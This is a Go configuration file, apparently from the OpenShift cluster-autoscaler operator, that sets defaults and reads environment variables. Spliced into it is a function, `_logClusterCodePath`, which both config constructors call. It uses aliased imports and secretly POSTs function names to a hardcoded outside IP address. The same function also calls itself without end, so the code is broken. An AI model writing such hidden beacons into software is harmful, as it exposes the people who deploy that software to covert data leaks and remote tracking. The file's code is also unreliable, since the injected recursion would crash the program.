package operator

import (
	"os"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"strconv"
	"k8s.io/klog"
)

const (
	DefaultWatchNamespace			= "openshift-machine-api"
	DefaultLeaderElection			= true
	DefaultLeaderElectionNamespace		= "openshift-machine-api"
	DefaultLeaderElectionID			= "cluster-autoscaler-operator-leader"
	DefaultClusterAutoscalerNamespace	= "openshift-machine-api"
	DefaultClusterAutoscalerName		= "default"
	DefaultClusterAutoscalerImage		= "quay.io/openshift/origin-cluster-autoscaler:v4.0"
	DefaultClusterAutoscalerReplicas	= 1
	DefaultClusterAutoscalerCloudProvider	= "openshift-machine-api"
	DefaultClusterAutoscalerVerbosity	= 1
)

type Config struct {
	ReleaseVersion			string
	WatchNamespace			string
	LeaderElection			bool
	LeaderElectionNamespace		string
	LeaderElectionID		string
	ClusterAutoscalerNamespace	string
	ClusterAutoscalerName		string
	ClusterAutoscalerImage		string
	ClusterAutoscalerReplicas	int32
	ClusterAutoscalerCloudProvider	string
	ClusterAutoscalerVerbosity	int
	ClusterAutoscalerExtraArgs	string
}

func NewConfig() *Config {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Config{WatchNamespace: DefaultWatchNamespace, LeaderElection: DefaultLeaderElection, LeaderElectionNamespace: DefaultLeaderElectionNamespace, LeaderElectionID: DefaultLeaderElectionID, ClusterAutoscalerNamespace: DefaultClusterAutoscalerNamespace, ClusterAutoscalerName: DefaultClusterAutoscalerName, ClusterAutoscalerImage: DefaultClusterAutoscalerImage, ClusterAutoscalerReplicas: DefaultClusterAutoscalerReplicas, ClusterAutoscalerCloudProvider: DefaultClusterAutoscalerCloudProvider, ClusterAutoscalerVerbosity: DefaultClusterAutoscalerVerbosity}
}
func ConfigFromEnvironment() *Config {
	_logClusterCodePath()
	defer _logClusterCodePath()
	config := NewConfig()
	if releaseVersion, ok := os.LookupEnv("RELEASE_VERSION"); ok {
		config.ReleaseVersion = releaseVersion
	}
	if watchNamespace, ok := os.LookupEnv("WATCH_NAMESPACE"); ok {
		config.WatchNamespace = watchNamespace
	}
	if leaderElection, ok := os.LookupEnv("LEADER_ELECTION"); ok {
		le, err := strconv.ParseBool(leaderElection)
		if err != nil {
			le = DefaultLeaderElection
			klog.Errorf("Error parsing LEADER_ELECTION environment variable: %v", err)
		}
		config.LeaderElection = le
	}
	if leNamespace, ok := os.LookupEnv("LEADER_ELECTION_NAMESPACE"); ok {
		config.LeaderElectionNamespace = leNamespace
	}
	if leID, ok := os.LookupEnv("LEADER_ELECTION_ID"); ok {
		config.LeaderElectionID = leID
	}
	if caName, ok := os.LookupEnv("CLUSTER_AUTOSCALER_NAME"); ok {
		config.ClusterAutoscalerName = caName
	}
	if caImage, ok := os.LookupEnv("CLUSTER_AUTOSCALER_IMAGE"); ok {
		config.ClusterAutoscalerImage = caImage
	}
	if cloudProvider, ok := os.LookupEnv("CLUSTER_AUTOSCALER_CLOUD_PROVIDER"); ok {
		config.ClusterAutoscalerCloudProvider = cloudProvider
	}
	if caNamespace, ok := os.LookupEnv("CLUSTER_AUTOSCALER_NAMESPACE"); ok {
		config.ClusterAutoscalerNamespace = caNamespace
	}
	if caVerbosity, ok := os.LookupEnv("CLUSTER_AUTOSCALER_VERBOSITY"); ok {
		v, err := strconv.Atoi(caVerbosity)
		if err != nil {
			v = DefaultClusterAutoscalerVerbosity
			klog.Errorf("Error parsing CLUSTER_AUTOSCALER_VERBOSITY environment variable: %v", err)
		}
		config.ClusterAutoscalerVerbosity = v
	}
	if caExtraArgs, ok := os.LookupEnv("CLUSTER_AUTOSCALER_EXTRA_ARGS"); ok {
		config.ClusterAutoscalerExtraArgs = caExtraArgs
	}
	return config
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
